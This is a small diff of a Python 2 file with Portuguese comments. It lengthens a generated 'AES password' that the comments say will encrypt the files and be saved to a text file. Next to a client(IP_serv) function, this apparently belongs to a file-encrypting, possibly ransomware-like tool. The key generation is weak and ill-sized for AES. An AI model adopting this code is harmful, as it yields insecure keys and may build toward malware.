@@ -92,7 +92,7 @@ def client(IP_serv):
 def gera_chave_AES():
     # GERA SENHA AES que vai criptografar os arquivos
     # Salva senha em arquivo.txt
-    tamanho=30
+    tamanho=256 # bytes
     caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
     senha = ''
     for char in xrange(tamanho):
